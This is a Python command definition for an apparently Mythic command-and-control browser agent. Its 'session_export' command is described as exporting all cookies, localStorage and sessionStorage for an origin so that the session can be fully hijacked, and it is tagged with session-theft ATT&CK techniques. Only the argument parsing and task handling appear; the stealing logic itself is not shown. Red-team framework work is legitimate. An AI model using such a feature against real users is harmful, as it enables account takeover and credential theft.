from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class SessionExportArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="origin",
                type=ParameterType.String,
                description="Origin to export (e.g. https://app.example.com). Defaults to the active tab's origin.",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            stripped = self.command_line.strip()
            if stripped.startswith("{"):
                self.load_args_from_json_string(stripped)
            else:
                self.add_arg("origin", stripped)


class SessionExportCommand(CommandBase):
    cmd            = "session_export"
    needs_admin    = False
    help_cmd       = "session_export [origin]"
    description    = (
        "Export a complete session package for an origin: all cookies, localStorage, "
        "and sessionStorage. The resulting JSON file can be imported into another "
        "browser to fully hijack the session."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = SessionExportArguments
    parameters     = []
    attackmapping  = ["T1539", "T1185"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        origin = task.args.get_arg("origin")
        task.display_params = origin or "(active tab)"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
